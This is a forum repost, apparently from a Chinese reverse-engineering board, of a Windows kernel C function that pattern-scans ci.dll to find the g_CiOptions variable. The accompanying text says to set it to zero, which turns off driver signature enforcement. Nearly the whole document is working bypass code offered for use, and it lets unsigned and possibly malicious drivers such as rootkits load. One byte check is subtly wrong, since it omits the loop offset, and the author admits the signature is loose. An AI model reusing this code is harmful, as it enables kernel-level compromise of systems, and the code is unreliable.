from https://bbs.pediy.com/thread-187699.htm  
我只提供实现函数,这个函数执行成功后返回是g_CiOptions的地址,置零即可,默认是6(4+2).  
if success ,return address of g_CiOptions,simple set it to zero,by default 6(4+2)  
```
PVOID FindCiOptions()
{
  ULONG i  = 0;  
  PVOID pCiInitialize = NULL;
  PVOID pCipInitialize = NULL;
  PVOID pg_CiOptions = NULL;
   
 
  SYSTEM_MODULE_INFORMATION ci_mod_info;
   
  //找到ci.dll的基地址
  if (!GetSysModuleInfo("ci.dll", &ci_mod_info)){
                KdPrint(("!!!!Get NDIS Module Info failed!\n"));
                return 0;
        }
 
  //获取CiInitialize在内存中的地址
  pCiInitialize = KernelGetProcAddress(ci_mod_info.ImageBase , "CiInitialize");
 
  if (pCiInitialize == NULL)
  {
    DbgPrint("cannot find ci!CiInitialize\n");
    return 0;
  }
 
  DbgPrint(" find ci!CiInitialize:%p\n",pCiInitialize);
  //在CiInitialize里查找 CipInitialize,就一个跳转:
  //jmp CipInitialize
  //..function end (0xcc or 0x90)
  //
 
  for (i = 0 ; i < 0x100 ; i ++)
  {
    if (*(BYTE*)((ULONG_PTR)pCiInitialize + i) == 0xE9 &&
      (*(BYTE*)((ULONG_PTR)pCiInitialize + i + 5) == 0xCC || *(BYTE*)((ULONG_PTR)pCiInitialize + 5) == 0x90)) 
    {
      break ; 
    }
  }
 
  if (i == 0x100)
  {
    DbgPrint("Cannot find ci!CipInitialize\n");
    return 0 ; 
  }
 
  //计算 CipInitialize的地址
 
  pCipInitialize = (PVOID)(*(LONG*)((ULONG_PTR)pCiInitialize + i + 1) + 5 + (ULONG_PTR)pCiInitialize + i );
 
  //is CipInitialize in ci.dll module area
 
  if ((ULONG_PTR)pCipInitialize <= (ULONG_PTR)ci_mod_info.ImageBase ||
    (ULONG_PTR)pCipInitialize >= (ULONG_PTR)ci_mod_info.ImageBase + ci_mod_info.ImageSize - 0x120)
  {
    DbgPrint("ci!CipInitialize illegal\n");
    return 0 ; 
  }
 
  DbgPrint(" find ci!pCipInitialize:%p\n",pCipInitialize);
 
  //find win7,win8,win8.1:
  // mov cs:XXXXX , ecx  ... g_CiOptions
  //
 
  for (i = 0 ; i < 0x100 ; i ++)
  {
    //这里的特征码我就简单点了,严格来说这样是不行的,得再参考一下下一个指令
    if((*(ULONG_PTR*)((ULONG_PTR)pCipInitialize + i) & 0x0000ffff) == 0x0d89)
  //  if (*(WORD*)((ULONG_PTR)((ULONG_PTR)pCipInitialize + i) & 0x0000ffff) == 0x0d89 /*&& (*(WORD*)((ULONG_PTR)( (ULONG_PTR)pCipInitialize + 6)  & 0x0000ffff) ==  0x15ff )*/)
    {
      break;
    }
 
 
  }
 
  if (i == 0x100)
  {
    DbgPrint("cannot find g_CiOptins in CipInitialize\n");
    return 0 ; 
  }
 
 
 
  //calculate address of g_CiOptions ;
  pg_CiOptions = (PVOID)(*(LONG*)((ULONG_PTR)pCipInitialize + i + 0x2) + (ULONG_PTR)pCipInitialize + i  + 0x6 );
 
 
 
 
  DbgPrint("---%p,%p\n",pg_CiOptions,i);
 
 
  if ((ULONG_PTR)pg_CiOptions <= (ULONG_PTR)ci_mod_info.ImageBase ||
    (ULONG_PTR)pg_CiOptions >= (ULONG_PTR)ci_mod_info.ImageBase + ci_mod_info.ImageSize)
  {
    DbgPrint("ci!pg_CiOptions illegal,%p,%p\n",ci_mod_info.ImageBase,ci_mod_info.ImageBase + ci_mod_info.ImageSize);
    return 0 ; 
  }
 
  return pg_CiOptions;
}
```